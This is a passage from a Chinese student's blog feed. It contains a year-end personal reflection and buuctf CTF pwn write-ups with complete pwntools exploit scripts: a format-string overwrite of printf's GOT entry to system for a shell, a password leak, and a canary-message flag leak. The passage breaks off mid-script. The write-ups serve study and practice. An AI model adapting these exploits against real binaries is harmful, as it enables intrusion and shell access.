class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a47</span><span class="token punctuation">,</span> <span class="token number">0xebc81</span><span class="token punctuation">,</span> <span class="token number">0xebc85</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep3 <span class="token operator">=</span> <span class="token string">b'\\x00'</span>p3 <span class="token operator">=</span> p3<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，<code>houseofsome</code>虽然没有写出来，但是在写这题的过程中学到了很多</p><ul><li>覆盖<code>main_arena</code>可以修改<code>top chunk</code>的地址</li><li>只能写<code>\x00</code>在<code>libc</code>的时候可以覆盖<code>stdin</code>的<code>_IO_buf_base</code>为指向<code>_IO_buf_end</code>的地址（前提是指向<code>_IO_buf_end</code>的值末尾就是<code>\x00</code>），覆盖为要写的地址</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> IO </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年终总结</title>
      <link href="/2023/12/27/nian-zhong-zong-jie/"/>
      <url>/2023/12/27/nian-zhong-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>–starrysky平平无奇却又热烈精彩的18岁</p><h3 id="关于pwn"><a href="#关于pwn" class="headerlink" title="关于pwn"></a>关于pwn</h3><p>年初学完了栈的大部分基础知识，寒假在队长的指导下开始接触堆，堆的源码阅读和<code>how2heap</code>都看了几个月，但最后也成功看完啦。目前主要计划是继续训练，通过<code>buuctf</code>的题目和比赛的复现来巩固和补充堆栈知识，这一步做的差不多以后计划开始学习系统安全。这一年参加了很多比赛，下至新生赛，上至各种线下赛，从充人数到年底的香山杯决赛自己拿了名次。2024要继续加油啊</p><h3 id="关于摄影"><a href="#关于摄影" class="headerlink" title="关于摄影"></a>关于摄影</h3><p>除了计算机最大的兴趣就是摄影了吧，但其实上了大学没什么时间去练习，只有出去旅游比赛有时间真正去好好拍一些照片。我喜欢自然风光摄影，但是来年有时间想试试欧根纱拍人像，虽然一开始买尼康就是为了拍自然风光。下面是一些我觉得拍的还不错的，拍摄地：盐城电影院、南京牛首山、北京天安门</p><img src="/2023/12/27/nian-zhong-zong-jie/%E7%9B%90%E5%9F%8E%E7%94%B5%E5%BD%B1%E9%99%A2.jpg" class><img src="/2023/12/27/nian-zhong-zong-jie/%E7%89%9B%E9%A6%96%E5%B1%B1.jpg" class><img src="/2023/12/27/nian-zhong-zong-jie/%E5%8C%97%E4%BA%AC.jpg" class><h3 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h3><p>这一年创建了自己的个人博客，拿到了驾照，学习了做甜品，退了学生会和电视台，和队长一起做了宣传海报和ppt，考了普通话和四级，看了演唱会和天安门升旗，去了很多城市：南京、合肥、深圳、中山、常州、北京，经历了很多前十八年都没做过的事：和队友两个人飞去隔着半个中国的地方、到每个班级进行团队宣讲和招新、通宵打比赛、参与实习面试…是磨练也是难忘的回忆。</p><p>学业上这一年可能是有点划水了，其他事情也很多，对不感兴趣的学科也不怎么学的下去，还有几周就期末考试了，冲一下二等奖学金吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题（持续更新）</title>
      <link href="/2023/12/16/buuctf-shua-ti-chi-xu-geng-xin/buuctf-shua-ti-chi-xu-geng-xin/"/>
      <url>/2023/12/16/buuctf-shua-ti-chi-xu-geng-xin/buuctf-shua-ti-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>（写了七十几题之后开始写这篇博客，前面的不想补啦</p><h2 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a><a href="https://buuoj.cn/challenges#wdb_2018_2nd_easyfmt">wdb_2018_2nd_easyfmt</a></h2><p>看题目名字就是格式化字符串的题，先检查保护，32位没开任何保护</p><pre class="line-numbers language-none"><code class="language-none">➜  wdb_2018_2nd_easyfmt checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wdb_2018_2nd_easyfmt&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8047000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再反编译看是否是栈上的格式化字符串</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[100]; &#x2F;&#x2F; [esp+8h] [ebp-70h] BYREF  unsigned int v4; &#x2F;&#x2F; [esp+6Ch] [ebp-Ch]  v4 &#x3D; __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  puts(&quot;Do you know repeater?&quot;);  while ( 1 )  &#123;    read(0, buf, 0x64u);    printf(buf);    putchar(10);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认是栈上的格式化字符串，基本思路就是泄露<code>libc</code>基址，然后改<code>prinitf</code>为<code>system</code></p><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26003</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'%35$p'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Do you know repeater?\n'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xf7</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>printf <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesys1 <span class="token operator">=</span> system <span class="token operator">&amp;</span> <span class="token number">0xff</span>sys2 <span class="token operator">=</span> system <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sys1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%14$hhn'</span> <span class="token operator">+</span> <span class="token string">'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sys2<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>sys1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%15$hn'</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="picoctf-2018-leak-me"><a href="#picoctf-2018-leak-me" class="headerlink" title="picoctf_2018_leak_me"></a><a href="https://buuoj.cn/challenges#picoctf_2018_leak_me">picoctf_2018_leak_me</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  picoctf_2018_leak_me checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;picoctf_2018_leak_me&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反编译出的主要部分如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">puts(&quot;What is your name?&quot;);  fgets(v5, 0x100, stdin);  v8 &#x3D; strchr(v5, &#39;\n&#39;);  if ( v8 )    *v8 &#x3D; &#39;\0&#39;;  strcat(v5, &quot;,\nPlease Enter the Password.&quot;);  stream &#x3D; fopen(&quot;password.txt&quot;, &quot;r&quot;);  if ( !stream )  &#123;    puts(      &quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;);    exit(0);  &#125;  fgets(s, 0x40, stream);  printf(&quot;Hello &quot;);  puts(v5);  fgets(s1, 0x40, stdin);  v5[0] &#x3D; 0;  if ( !strcmp(s1, s) )    ((void (__cdecl *)(int *))flag)(p_argc);  else    puts(&quot;Incorrect Password!&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先创建一个<code>flag.txt</code>和<code>password.txt</code>,然后输入<code>0x100</code>个<code>a</code>，结果直接输出了<code>password</code></p><pre class="line-numbers language-none"><code class="language-none">➜  picoctf_2018_leak_me .&#x2F;pwnWhat is your name?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,bbbIncorrect Password!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那就直接打远程，先拿到<code>password</code>然后直接拿到<code>flag</code></p><pre class="line-numbers language-none"><code class="language-none">➜  picoctf_2018_leak_me nc node4.buuoj.cn 29296What is your name?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_f85406a_reAllY_s3cuRe_p4s$word_f85406flag&#123;f22f5647-b8c8-42e2-b854-f0b8cc9b4399&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入<code>0x100</code>个<code>a</code>会直接报错，所以少输几个也能泄露<code>password</code>,再输入就去就行了</p><h2 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a><a href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></h2><p>检查保护，开了<code>canary</code></p><pre class="line-numbers language-none"><code class="language-none">➜  wdb2018_guess checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wdb2018_guess&#x2F;pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反汇编</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">v10 &#x3D; __readfsqword(0x28u);v7 &#x3D; 3LL;LODWORD(stat_loc.__uptr) &#x3D; 0;v6 &#x3D; 0LL;sub_4009A6(a1, a2, a3);HIDWORD(stat_loc.__iptr) &#x3D; open(&quot;.&#x2F;flag.txt&quot;, 0);if ( HIDWORD(stat_loc.__iptr) &#x3D;&#x3D; -1 )&#123;  perror(&quot;.&#x2F;flag.txt&quot;);  _exit(-1);&#125;read(SHIDWORD(stat_loc.__iptr), buf, 48uLL);close(SHIDWORD(stat_loc.__iptr));puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);while ( 1 )&#123;  if ( v6 &gt;&#x3D; v7 )  &#123;    puts(&quot;you have no sense... bye :-) &quot;);    return 0LL;  &#125;  if ( !(unsigned int)sub_400A11() )    break;  ++v6;  wait((__WAIT_STATUS)&amp;stat_loc);&#125;puts(&quot;Please type your guessing flag&quot;);gets(s2);if ( !strcmp(buf, s2) )  puts(&quot;You must have great six sense!!!! :-o &quot;);else  puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);return 0LL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序的功能就是判断输入的<code>flag</code>，在<code>gets</code>处可溢出但没有输出，因此需要利用<code>canary</code>的报错来泄露内存</p><p>在低版本的<code>glibc</code>中触发<code>canary</code>保护会输出<code>__libc_argv[0]</code>,因此需要利用溢出来覆盖它使得泄露<code>flag</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123;  &#x2F;* The loop is added only to keep gcc happy.  *&#x2F;  while (1)    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;libc_hidden_def (__fortify_fail)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以解题思路就是覆盖<code>__libc_argv[0]</code>为<code>flag</code>的地址，计算<code>flag</code>的地址可以通过泄露<code>libc</code>中存储栈地址的一个变量<code>environ</code>，而<code>environ</code>的地址可以通过<code>libc</code>计算得到，所以要先通过泄露<code>puts_got</code>来得到<code>libc_base</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28010</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please type your guessing flag'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>environ_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__environ'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please type your guessing flag'</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x168</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x128</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please type your guessing flag'</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a><a href="https://buuoj.cn/challenges#cmcc_pwnme2">cmcc_pwnme2</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  cmcc_pwnme2 checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;cmcc_pwnme2&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序中存在栈溢出</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[132]; &#x2F;&#x2F; [esp+0h] [ebp-88h] BYREF  string &#x3D; 0;  fflush(stdout);  puts(&quot;Welcome&quot;);  puts(&quot;Please input:&quot;);  fflush(stdout);  gets(s);  userfunction(s);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl userfunction(char *src)&#123;  char dest[108]; &#x2F;&#x2F; [esp+Ch] [ebp-6Ch] BYREF  strcpy(dest, src);  return printf(&quot;Hello, %s\n&quot;, src);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">int exec_string()&#123;  char s; &#x2F;&#x2F; [esp+Bh] [ebp-Dh] BYREF  FILE *stream; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]  stream &#x3D; fopen(&amp;string, &quot;r&quot;);  if ( !stream )    perror(&quot;Wrong file&quot;);  fgets(&amp;s, 50, stream);  puts(&amp;s);  fflush(stdout);  return fclose(stream);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__cdecl add_home(int a1)&#123;  char *result; &#x2F;&#x2F; eax  if ( a1 &#x3D;&#x3D; 0xDEADBEEF )  &#123;    result &#x3D; (char *)(strlen(&amp;string) + 0x804A060);    strcpy(result, &quot;&#x2F;home&quot;);  &#125;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">char *__cdecl add_flag(int a1, int a2)&#123;  char *result; &#x2F;&#x2F; eax  if ( a1 &#x3D;&#x3D; 0xCAFEBABE &amp;&amp; a2 &#x3D;&#x3D; 0xABADF00D )  &#123;    result &#x3D; (char *)(strlen(&amp;string) + 0x804A060);    strcpy(result, &quot;&#x2F;.flag1&quot;);  &#125;  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目本意是调用<code>add_home</code> 和<code>add_flag</code>向<code>string</code>直接输入文件名之后调用<code>exec_string</code>读出<code>flag</code>，但是<code>buu</code>远程的文件名和程序里的不一样，所以可以直接读入<code>flag.txt</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token 